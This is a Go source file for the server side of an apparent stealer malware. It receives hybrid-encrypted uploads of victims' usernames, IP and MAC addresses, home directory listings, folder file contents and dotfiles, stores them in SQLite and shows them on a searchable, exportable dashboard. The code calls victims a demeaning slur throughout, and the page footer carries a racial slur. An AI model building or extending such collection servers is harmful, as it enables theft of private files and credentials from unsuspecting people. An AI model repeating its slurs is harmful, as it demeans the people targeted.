package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/cipher"
	"crypto/aes"
	"crypto"
	"database/sql"
	"encoding/json"
	"encoding/pem"
	"encoding/binary"
	"strings"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	_ "modernc.org/sqlite"
)


type FileContent struct {
	Name    string `json:"name"`
	Content string `json:"content"`
}

type Cuck struct {
	User    string                 `json:"user"`
	IP      string                 `json:"ip"`
	MAC     string                 `json:"mac"`
	Home    []string               `json:"home"`
	Folders map[string][]FileContent `json:"folders"` // dynamic folder keys
	Dots    map[string]string      `json:"dots"`      // dynamic dotfile keys
}

var (
	db         *sql.DB
	privateKey *rsa.PrivateKey
)

func main() {
	// Load RSA private key
	keyBytes, err := os.ReadFile("./keys/private.pem")
	if err != nil {
		log.Fatalf("Failed to read private.pem: %v", err)
	}
	block, _ := pem.Decode(keyBytes)
	if block == nil || block.Type != "PRIVATE KEY" {
		log.Fatal("Invalid private key (expecting PRIVATE KEY)")
	}
	key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil {
		key, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			log.Fatalf("Failed to parse private key: %v", err)
		}
	}
	var ok bool
	privateKey, ok = key.(*rsa.PrivateKey)
	if !ok {
		log.Fatal("Private key is not an RSA key")
	}

	// Open SQLite database
	db, err = sql.Open("sqlite", "cucks.db")
	if err != nil {
		log.Fatalf("Failed to open database: %v", err)
	}
	defer db.Close()

	// Create table with generic columns
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS cucks (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		user TEXT,
		ip TEXT,
		mac TEXT,
		home_files TEXT,
		folders TEXT,          -- JSON object with dynamic folder keys
		dots TEXT,             -- JSON object with dynamic dotfile keys
		raw_json TEXT,
		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
	)`)
	if err != nil {
		log.Fatalf("Failed to create table: %v", err)
	}

	http.HandleFunc("/collect", handleCollect)
	http.HandleFunc("/list", handleList)

	port := "8080"
	log.Printf("Listening on :%s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func handleCollect(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil || len(body) < 2 {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	// 1. Read 2-byte RSA Key Length prefix
	rsaKeyLen := int(binary.BigEndian.Uint16(body[:2]))
	minLen := 2 + rsaKeyLen + 12
	if len(body) < minLen {
		http.Error(w, "Malformed payload structure", http.StatusBadRequest)
		return
	}

	offset := 2
	encAesKey := body[offset : offset+rsaKeyLen]
	offset += rsaKeyLen
	iv := body[offset : offset+12]
	offset += 12
	ciphertext := body[offset:]

	// RSA decryption
	aesKey, err := privateKey.Decrypt(rand.Reader, encAesKey, &rsa.OAEPOptions{
		Hash:     crypto.SHA256,
		MGFHash:  crypto.SHA1,
		Label:    nil,
	})
	if err != nil {
		log.Printf("RSA decryption failed: %v", err)
		http.Error(w, "Decryption error", http.StatusInternalServerError)
		return
	}

	// AES-GCM decryption
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		log.Printf("AES cipher creation failed: %v", err)
		http.Error(w, "Cipher error", http.StatusInternalServerError)
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Printf("GCM initialization failed: %v", err)
		http.Error(w, "GCM error", http.StatusInternalServerError)
		return
	}
	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		log.Printf("AES-GCM decryption/authentication failed: %v", err)
		http.Error(w, "Decryption error", http.StatusBadRequest)
		return
	}

	var cuck Cuck
	if err := json.Unmarshal(plaintext, &cuck); err != nil {
		log.Printf("JSON parse error: %v", err)
		http.Error(w, "JSON error", http.StatusBadRequest)
		return
	}

	homeStr := strings.Join(cuck.Home, "\n")

	foldersJSON, _ := json.Marshal(cuck.Folders)
	dotsJSON, _ := json.Marshal(cuck.Dots)
	rawJSON := string(plaintext)

	_, err = db.Exec(
		`INSERT INTO cucks 
		(user, ip, mac, home_files, folders, dots, raw_json)
		VALUES (?, ?, ?, ?, ?, ?, ?)`,
		cuck.User,
		cuck.IP,
		cuck.MAC,
		homeStr,
		string(foldersJSON),
		string(dotsJSON),
		rawJSON,
	)
	if err != nil {
		log.Printf("DB insert error: %v", err)
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	log.Printf("[CUCKED] %s %s %s\n", cuck.User, cuck.IP, cuck.MAC)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

const dashboardCSS = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OBSESSION</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root {
  --bg: #050505;
  --bg-elevated: #0a0a0a;
  --bg-card: #0d0d0d;
  --bg-hover: #181818;
  --bg-code: #080808;
  --border: #2a2a2a;
  --border-light: #404040;
  --text: #ffffff;
  --text-bright: #ffffff;
  --text-muted: #cccccc;
  --text-dim: #888888;
  --text-faint: #444444;
  --json-key: #00fc22;
  --json-string: #e0e0e0;
  --json-number: #ffffff;
  --json-bool: #bbbbbb;
  --json-null: #666666;
  --radius: 6px;
  --radius-sm: 6px;
  --shadow: 0 8px 32px rgba(0,0,0,0.8);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
html { scrollbar-width: thin; scrollbar-color: #333 #050505; }
::-webkit-scrollbar { width: 8px; height: 8px; }
::-webkit-scrollbar-track { background: #050505; }
::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
::-webkit-scrollbar-thumb:hover { background: #555; }

body {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
  background: var(--bg);
  color: var(--text);
  line-height: 1.5;
  min-height: 100vh;
  font-size: 13px;
}

/* Header */
.header {
  background: var(--bg-elevated);
  border-bottom: 1px solid var(--border);
  padding: 1.25rem 2rem;
  position: sticky;
  top: 0;
  z-index: 100;
}
.header-content {
  max-width: 1700px;
  margin: 0 auto;
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
  gap: 1rem;
}
.header h1 {
  font-size: 1.4rem;
  font-weight: 700;
  color: var(--text-bright);
  letter-spacing: -0.02em;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}
.header h1::before {
  content: "◉";
  color: var(--text-bright);
  font-size: 1rem;
}
.header-actions { display: flex; gap: 0.5rem; align-items: center; }

/* Stats */
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 0.75rem;
  max-width: 1700px;
  margin: 0 auto;
  padding: 1.25rem 2rem 0;
}
.stat-card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 1rem 1.25rem;
  transition: border-color 0.2s;
}
.stat-card:hover { border-color: var(--border-light); }
.stat-label {
  font-size: 0.65rem;
  text-transform: uppercase;
  letter-spacing: 0.12em;
  color: var(--text-dim);
  margin-bottom: 0.4rem;
  font-weight: 500;
}
.stat-value {
  font-size: 1.6rem;
  font-weight: 700;
  color: var(--text-bright);
  letter-spacing: -0.02em;
}
.stat-card:nth-child(3) .stat-value,
.stat-card:nth-child(4) .stat-value {
  font-size: 0.9rem;
  font-weight: 500;
  margin-top: 0.3rem;
  color: var(--text-muted);
}

/* Toolbar */
.toolbar {
  max-width: 1700px;
  margin: 0 auto;
  padding: 1.25rem 2rem;
  display: flex;
  gap: 0.75rem;
  flex-wrap: wrap;
  align-items: center;
}
.search-box {
  position: relative;
  flex: 1;
  min-width: 260px;
  max-width: 420px;
}
.search-box input {
  width: 100%;
  padding: 0.65rem 1rem 0.65rem 2.5rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius-sm);
  color: var(--text-bright);
  font-size: 0.85rem;
  transition: all 0.2s;
  font-family: inherit;
}
.search-box input:focus {
  outline: none;
  border-color: var(--border-light);
  box-shadow: 0 0 0 2px rgba(255,255,255,0.08);
}
.search-box::before {
  content: "⌕";
  position: absolute;
  left: 0.9rem;
  top: 50%;
  transform: translateY(-50%);
  color: var(--text-dim);
  font-size: 1rem;
  pointer-events: none;
}
.btn {
  padding: 0.65rem 1rem;
  border: 1px solid var(--border);
  background: var(--bg-card);
  color: var(--text-muted);
  border-radius: var(--radius-sm);
  cursor: pointer;
  font-size: 0.8rem;
  font-weight: 500;
  display: inline-flex;
  align-items: center;
  gap: 0.4rem;
  transition: all 0.15s;
  white-space: nowrap;
  font-family: inherit;
}
.btn:hover {
  background: var(--bg-hover);
  color: var(--text-bright);
  border-color: var(--border-light);
}
.btn-primary {
  background: var(--text-bright);
  border-color: var(--text-bright);
  color: var(--bg);
  font-weight: 600;
}
.btn-primary:hover {
  background: #ddd;
  border-color: #ddd;
  color: #000;
}
.btn.active {
  background: var(--bg-hover);
  border-color: var(--text-dim);
  color: var(--text-bright);
}

/* Table */
.table-container {
  max-width: 1700px;
  margin: 0 auto;
  padding: 0 2rem 2rem;
}
.table-wrapper {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  overflow: hidden;
  box-shadow: var(--shadow);
  overflow-x: auto;
}
table {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.82rem;
  min-width: 1500px;
  table-layout: fixed;
}
th {
  background: var(--bg-elevated);
  color: var(--text-muted);
  font-weight: 600;
  text-align: left;
  padding: 0.75rem 1rem;
  text-transform: uppercase;
  font-size: 0.68rem;
  letter-spacing: 0.08em;
  border-bottom: 1px solid var(--border);
  white-space: nowrap;
  cursor: pointer;
  user-select: none;
  position: sticky;
  top: 0;
  z-index: 10;
}
th:hover { color: var(--text-bright); background: #111; }
th .sort-icon {
  margin-left: 0.35rem;
  opacity: 0.3;
  font-size: 0.6rem;
  display: inline-block;
  width: 1em;
}
th.sort-asc .sort-icon::after { content: "▲"; opacity: 1; color: var(--text-bright); }
th.sort-desc .sort-icon::after { content: "▼"; opacity: 1; color: var(--text-bright); }

td {
  padding: 0.75rem 1rem;
  border-bottom: 1px solid var(--border);
  vertical-align: top;
  color: var(--text-bright);
  transition: background 0.1s;
}
tr:hover td { background: rgba(255,255,255,0.03); }
tr:last-child td { border-bottom: none; }

/* Column widths via colgroup */
col.id { width: 60px; }
col.user { width: 130px; }
col.ip { width: 140px; }
col.mac { width: 160px; }
col.json { width: 260px; }
col.time { width: 170px; }
col.actions { width: 50px; }

/* Cell layout */
.cell-wrap {
  align-items: flex-start;
  gap: 0.5rem;
}
.cell-text {
  flex: 1;
  min-width: 0;
  word-break: break-word;
  overflow-wrap: anywhere;
  color: var(--text-bright);
}

/* Copy button */
.copy-btn {
  opacity: 0;
  padding: 0.15rem 0.5rem;
  background: var(--bg-hover);
  border: 1px solid var(--border);
  border-radius: 4px;
  color: var(--text-dim);
  cursor: pointer;
  font-size: 0.65rem;
  font-weight: 500;
  transition: all 0.15s;
  flex-shrink: 0;
  margin-top: 0.05rem;
  font-family: inherit;
}
tr:hover .copy-btn,
td:hover .copy-btn { opacity: 1; }
.copy-btn:hover {
  background: var(--text-bright);
  color: var(--bg);
  border-color: var(--text-bright);
}
.copy-btn.copied {
  background: var(--text-bright);
  color: var(--bg);
  border-color: var(--text-bright);
}

/* Tags */
.tag {
  display: inline-block;
  padding: 0.2rem 0.6rem;
  border-radius: 4px;
  font-size: 0.76rem;
  font-weight: 500;
  background: var(--bg-hover);
  color: var(--text-muted);
  border: 1px solid var(--border);
  white-space: nowrap;
  font-family: 'JetBrains Mono', monospace;
  letter-spacing: -0.01em;
}

/* ID */
.id-cell {
  font-family: 'JetBrains Mono', monospace;
  font-weight: 600;
  color: var(--text-bright);
  font-size: 0.82rem;
}

/* User cell - FIXED */
.user-cell {
  font-weight: 500;
  color: var(--text-bright);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* Preview block (used for home files, folders, dots) */
.preview-block {
  background: var(--bg-code);
  border: 1px solid var(--border);
  border-radius: var(--radius-sm);
  padding: 0.6rem 0.75rem;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.76rem;
  max-height: 140px;
  overflow: hidden;
  position: relative;
  line-height: 1.5;
  cursor: pointer;
  transition: border-color 0.2s;
  color: var(--text-muted);
}
.preview-block:hover {
  border-color: var(--border-light);
}
.preview-text {
  white-space: pre-wrap;
  word-break: break-word;
  overflow-wrap: anywhere;
  mask-image: linear-gradient(to bottom, black 60%, transparent 100%);
  -webkit-mask-image: linear-gradient(to bottom, black 60%, transparent 100%);
}
.preview-hint {
  position: absolute;
  bottom: 0.4rem;
  right: 0.5rem;
  font-size: 0.6rem;
  color: var(--text-dim);
  background: var(--bg-code);
  padding: 0.1rem 0.4rem;
  border-radius: 4px;
  border: 1px solid var(--border);
  pointer-events: none;
}

/* Modal */
.modal-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.88);
  backdrop-filter: blur(6px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.2s;
}
.modal-overlay.active {
  opacity: 1;
  pointer-events: auto;
}
.modal-box {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  width: 90vw;
  max-width: 1000px;
  max-height: 85vh;
  display: flex;
  flex-direction: column;
  box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9);
  transform: scale(0.96);
  transition: transform 0.2s;
}
.modal-overlay.active .modal-box {
  transform: scale(1);
}
.modal-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 1rem 1.25rem;
  border-bottom: 1px solid var(--border);
  gap: 1rem;
}
.modal-title {
  font-size: 0.9rem;
  font-weight: 600;
  color: var(--text-bright);
}
.modal-header-actions {
  display: flex;
  gap: 0.5rem;
  align-items: center;
}
.modal-close {
  background: none;
  border: 1px solid var(--border);
  color: var(--text-dim);
  width: 28px;
  height: 28px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 1rem;
  transition: all 0.15s;
}
.modal-close:hover {
  background: var(--bg-hover);
  color: var(--text-bright);
  border-color: var(--border-light);
}
.modal-body {
  padding: 1rem 1.25rem;
  overflow: auto;
  flex: 1;
}
.modal-body pre {
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.82rem;
  line-height: 1.7;
  white-space: pre-wrap;
  word-break: break-word;
  margin: 0;
}

/* JSON syntax highlighting in modal */
.json-key { color: var(--json-key); }
.json-string { color: var(--json-string); }
.json-number { color: var(--json-number); font-weight: 500; }
.json-boolean { color: var(--json-bool); font-weight: 500; }
.json-null { color: var(--json-null); font-style: italic; }

.modal-footer {
  padding: 0.75rem 1.25rem;
  border-top: 1px solid var(--border);
  display: flex;
  justify-content: flex-end;
  gap: 0.5rem;
}

/* Timestamp */
.timestamp {
  color: var(--text-muted);
  font-size: 0.8rem;
  font-family: 'JetBrains Mono', monospace;
  white-space: nowrap;
}

/* Row actions */
.row-actions {
  display: flex;
  gap: 0.2rem;
  opacity: 0;
  transition: opacity 0.15s;
}
tr:hover .row-actions { opacity: 1; }
.icon-btn {
  width: 26px;
  height: 26px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: transparent;
  border: 1px solid transparent;
  border-radius: 5px;
  color: var(--text-dim);
  cursor: pointer;
  font-size: 0.85rem;
  transition: all 0.15s;
}
.icon-btn:hover { background: var(--bg-hover); border-color: var(--border); color: var(--text-bright); }

/* Empty */
.empty-state {
  text-align: center;
  padding: 4rem 2rem;
  color: var(--text-dim);
}
.empty-state-icon { font-size: 2.5rem; margin-bottom: 0.75rem; opacity: 0.3; }

/* Toast */
.toast {
  position: fixed;
  bottom: 1.5rem;
  right: 1.5rem;
  padding: 0.75rem 1.25rem;
  background: var(--bg-elevated);
  border: 1px solid var(--border);
  border-radius: var(--radius-sm);
  box-shadow: var(--shadow);
  display: flex;
  align-items: center;
  gap: 0.6rem;
  transform: translateY(80px);
  opacity: 0;
  transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
  z-index: 2000;
  font-size: 0.85rem;
  color: var(--text-bright);
}
.toast.show { transform: translateY(0); opacity: 1; }

/* Footer */
.footer {
  max-width: 1700px;
  margin: 0 auto;
  padding: 0.5rem 2rem 2rem;
  text-align: center;
  color: var(--text-dim);
  font-size: 0.75rem;
}

/* Animations */
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(6px); }
  to { opacity: 1; transform: translateY(0); }
}
tbody tr { animation: fadeIn 0.2s ease forwards; }

/* Responsive */
@media (max-width: 768px) {
  .header-content { flex-direction: column; align-items: flex-start; }
  .stats-grid { grid-template-columns: repeat(2, 1fr); padding: 1rem; gap: 0.5rem; }
  .toolbar { padding: 1rem; }
  .table-container { padding: 0 1rem 1rem; }
  .header, .toolbar, .stats-grid, .table-container, .footer { padding-left: 1rem; padding-right: 1rem; }
}
</style>
</head>
<body>`

const dashboardJS = `
<script>
(function() {
  function showToast(msg) {
    let t = document.getElementById('toast');
    if (!t) { t = document.createElement('div'); t.id = 'toast'; t.className = 'toast'; document.body.appendChild(t); }
    t.innerHTML = '<span style="font-weight:700;color:#fff;">✓</span><span>' + msg + '</span>';
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 1800);
  }
  function copyText(text, label) {
    navigator.clipboard.writeText(text).then(() => showToast(label + ' copied')).catch(() => {
      const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); showToast(label + ' copied');
    });
  }
  window.copyCell = function(btn, label) {
    event.stopPropagation();
    const cell = btn.closest('td,th');
    const text = cell.querySelector('.cell-text, .preview-text')?.innerText || cell.innerText;
    copyText(text.trim(), label || 'Value');
    btn.classList.add('copied'); btn.innerText = '✓';
    setTimeout(() => { btn.classList.remove('copied'); btn.innerText = 'Copy'; }, 1200);
  };
  window.copyRow = function(btn) {
    event.stopPropagation();
    const row = btn.closest('tr');
    const texts = Array.from(row.querySelectorAll('td')).map(c => {
      const el = c.querySelector('.cell-text, .preview-text');
      return el ? el.innerText.trim() : c.innerText.trim();
    });
    copyText(texts.join('\t'), 'Row');
  };
  window.filterTable = function() {
    const q = document.getElementById('searchInput').value.toLowerCase();
    let visible = 0;
    document.querySelectorAll('tbody tr').forEach(row => {
      const match = row.innerText.toLowerCase().includes(q);
      row.style.display = match ? '' : 'none';
      if (match) visible++;
    });
    document.getElementById('visibleCount').innerText = visible;
  };
  let sortDir = {};
  window.sortTable = function(idx) {
    const tbody = document.querySelector('tbody');
    const rows = Array.from(tbody.querySelectorAll('tr'));
    const ths = document.querySelectorAll('th');
    ths.forEach(th => th.classList.remove('sort-asc','sort-desc'));
    sortDir[idx] = !sortDir[idx];
    ths[idx].classList.add(sortDir[idx] ? 'sort-asc' : 'sort-desc');
    rows.sort((a,b) => {
      let av = a.cells[idx]?.innerText.trim() || '';
      let bv = b.cells[idx]?.innerText.trim() || '';
      const an = parseFloat(av), bn = parseFloat(bv);
      if (!isNaN(an) && !isNaN(bn) && av === String(an) && bv === String(bn)) return sortDir[idx] ? an - bn : bn - an;
      return sortDir[idx] ? av.localeCompare(bv) : bv.localeCompare(av);
    });
    rows.forEach(r => tbody.appendChild(r));
  };

  // JSON syntax highlighting
  function highlightJSON(text) {
    // Escape HTML first
    let html = text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    // Keys: "key":
    html = html.replace(/("(?:[^"\\]|\\.)*")(\s*:)/g, '<span class="json-key">$1</span><span class="json-string">$2</span>');
    // Strings: "value"
    html = html.replace(/: (\"(?:[^"\\]|\\.)*\")/g, ': <span class="json-string">$1</span>');
    // Numbers
    html = html.replace(/: (-?\d+\.?\d*)/g, ': <span class="json-number">$1</span>');
    // Booleans
    html = html.replace(/: (true|false)/g, ': <span class="json-boolean">$1</span>');
    // Null
    html = html.replace(/: (null)/g, ': <span class="json-null">$1</span>');
    return html;
  }

  function formatJSON(raw) {
    try {
      return JSON.stringify(JSON.parse(raw), null, 2);
    } catch(e) {
      return raw;
    }
  }

  // Modal
  window.openModal = function(el, title, isJson) {
    let overlay = document.getElementById('jsonModal');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.id = 'jsonModal';
      overlay.className = 'modal-overlay';
      overlay.innerHTML = '<div class="modal-box"><div class="modal-header"><span class="modal-title"></span><div class="modal-header-actions"><button class="btn" id="modalToggleRaw" style="display:none;">Raw</button><button class="modal-close" onclick="closeModal()">✕</button></div></div><div class="modal-body"><pre id="modalPre"></pre></div><div class="modal-footer"><button class="btn" onclick="copyModalContent()">⎘ Copy</button><button class="btn btn-primary" onclick="closeModal()">Close</button></div></div>';
      overlay.onclick = function(e) { if (e.target === overlay) closeModal(); };
      document.body.appendChild(overlay);
    }
    const text = el.querySelector('.preview-text')?.innerText || el.innerText;
    overlay.dataset.raw = text;
    overlay.dataset.isJson = isJson ? '1' : '0';
    overlay.querySelector('.modal-title').innerText = title;

    const pre = document.getElementById('modalPre');
    const toggleBtn = document.getElementById('modalToggleRaw');

    if (isJson) {
      toggleBtn.style.display = '';
      overlay.dataset.formatted = '1';
      const formatted = formatJSON(text);
      pre.innerHTML = highlightJSON(formatted);
      toggleBtn.innerText = 'Raw';
      toggleBtn.classList.remove('active');
      toggleBtn.onclick = function() {
        if (overlay.dataset.formatted === '1') {
          pre.innerText = overlay.dataset.raw;
          overlay.dataset.formatted = '0';
          toggleBtn.innerText = 'Pretty';
          toggleBtn.classList.add('active');
        } else {
          pre.innerHTML = highlightJSON(formatJSON(overlay.dataset.raw));
          overlay.dataset.formatted = '1';
          toggleBtn.innerText = 'Raw';
          toggleBtn.classList.remove('active');
        }
      };
    } else {
      toggleBtn.style.display = 'none';
      pre.innerText = text;
    }

    overlay.classList.add('active');
    document.body.style.overflow = 'hidden';
  };
  window.closeModal = function() {
    const overlay = document.getElementById('jsonModal');
    if (overlay) { overlay.classList.remove('active'); document.body.style.overflow = ''; }
  };
  window.copyModalContent = function() {
    const overlay = document.getElementById('jsonModal');
    if (overlay && overlay.dataset.raw) copyText(overlay.dataset.raw, 'Content');
  };
  document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });

  window.exportCSV = function() {
    const rows = document.querySelectorAll('table tr');
    const csv = Array.from(rows).map(row => {
      return Array.from(row.querySelectorAll('th,td')).map(c => {
        const el = c.querySelector('.cell-text, .preview-text');
        const text = el ? el.innerText.trim() : c.innerText.trim();
        return '"' + text.replace(/"/g, '""') + '"';
      }).join(',');
    }).join('\n');
    const blob = new Blob([csv], {type:'text/csv'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a'); a.href = url;
    a.download = 'cucks_' + new Date().toISOString().slice(0,19).replace(/:/g,'-') + '.csv';
    a.click(); URL.revokeObjectURL(url); showToast('CSV exported');
  };
  let refreshInt;
  window.toggleRefresh = function(btn) {
    if (refreshInt) { clearInterval(refreshInt); refreshInt = null; btn.classList.remove('btn-primary'); btn.innerHTML = '⟳ Auto'; showToast('Auto refresh off'); }
    else { refreshInt = setInterval(() => location.reload(), 30000); btn.classList.add('btn-primary'); btn.innerHTML = '⏸ Auto (30s)'; showToast('Auto refresh on'); }
  };
  document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('totalCount').innerText = document.querySelectorAll('tbody tr').length;
    document.getElementById('visibleCount').innerText = document.querySelectorAll('tbody tr').length;
  });
})();
</script>
</body>
</html>`

func handleList(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query(`
		SELECT id, user, ip, mac, home_files, folders, dots, timestamp
		FROM cucks ORDER BY timestamp ASC
	`)
	if err != nil {
		http.Error(w, "DB error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	type Row struct {
		ID         int
		User, IP, MAC, HomeFiles, Folders, Dots, Timestamp string
	}
	var allRows []Row
	for rows.Next() {
		var row Row
		if err := rows.Scan(&row.ID, &row.User, &row.IP, &row.MAC, &row.HomeFiles, &row.Folders, &row.Dots, &row.Timestamp); err != nil {
			continue
		}
		allRows = append(allRows, row)
	}

	total := len(allRows)

	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, dashboardCSS)

	fmt.Fprintf(w, `
<div class="stats-grid">
  <div class="stat-card"><div class="stat-label">Total Records</div><div class="stat-value" id="totalCount">%d</div></div>
  <div class="stat-card"><div class="stat-label">Visible</div><div class="stat-value" id="visibleCount">%d</div></div>
  <div class="stat-card"><div class="stat-label">Last Update</div><div class="stat-value">Just now</div></div>
  <div class="stat-card"><div class="stat-label">Status</div><div class="stat-value">● Live</div></div>
</div>

<div class="toolbar">
  <div class="search-box">
    <input type="text" id="searchInput" placeholder="Search anything..." onkeyup="filterTable()">
  </div>
  <button class="btn" onclick="exportCSV()">⬇ Export CSV</button>
</div>

<div class="table-container">
  <div class="table-wrapper">
    <table>
      <colgroup>
        <col class="id">
        <col class="user">
        <col class="ip">
        <col class="mac">
        <col class="json">
        <col class="json">
        <col class="json">
        <col class="time">
        <col class="actions">
      </colgroup>
      <thead>
        <tr>
          <th onclick="sortTable(0)">ID <span class="sort-icon">⇅</span></th>
          <th onclick="sortTable(1)">User <span class="sort-icon">⇅</span></th>
          <th onclick="sortTable(2)">IP <span class="sort-icon">⇅</span></th>
          <th onclick="sortTable(3)">MAC <span class="sort-icon">⇅</span></th>
          <th>Home Files</th>
          <th>Folders</th>
          <th>Dots</th>
          <th onclick="sortTable(7)">Timestamp <span class="sort-icon">⇅</span></th>
          <th></th>
        </tr>
      </thead>
      <tbody>
`, total, total)

	if total == 0 {
		fmt.Fprint(w, `<tr><td colspan="9"><div class="empty-state"><div class="empty-state-icon">📭</div><div>No records found</div></div></td></tr>`)
	}

	for _, row := range allRows {
		fmt.Fprintf(w, `
        <tr>
          <td><div class="cell-wrap"><span class="cell-text id-cell">#%d</span><button class="copy-btn" onclick="copyCell(this,'ID')">Copy</button></div></td>
          <td><div class="cell-wrap"><span class="cell-text user-cell">%s</span><button class="copy-btn" onclick="copyCell(this,'User')">Copy</button></div></td>
          <td><div class="cell-wrap"><span class="cell-text tag">%s</span><button class="copy-btn" onclick="copyCell(this,'IP')">Copy</button></div></td>
          <td><div class="cell-wrap"><span class="cell-text tag">%s</span><button class="copy-btn" onclick="copyCell(this,'MAC')">Copy</button></div></td>
          <td onclick="openModal(this,'Home Files', false)">
            <div class="preview-block">
              <div class="preview-text">%s</div>
              <span class="preview-hint">Click to expand</span>
            </div>
          </td>
          <td onclick="openModal(this,'Folders JSON', true)">
            <div class="preview-block">
              <div class="preview-text">%s</div>
              <span class="preview-hint">Click to expand</span>
            </div>
          </td>
          <td onclick="openModal(this,'Dots JSON', true)">
            <div class="preview-block">
              <div class="preview-text">%s</div>
              <span class="preview-hint">Click to expand</span>
            </div>
          </td>
          <td><div class="cell-wrap"><span class="cell-text timestamp">%s</span><button class="copy-btn" onclick="copyCell(this,'Time')">Copy</button></div></td>
          <td><div class="row-actions"><button class="icon-btn" onclick="event.stopPropagation();copyRow(this)" title="Copy row">⎘</button></div></td>
        </tr>`,
			row.ID, row.User, row.IP, row.MAC, row.HomeFiles, row.Folders, row.Dots, row.Timestamp)
	}

	fmt.Fprintf(w, `
      </tbody>
    </table>
  </div>
</div>

<div class="footer">
  <span>◉ FUCK THIS GOOKS — %d records</span>
</div>
`, total)

	fmt.Fprint(w, dashboardJS)
}
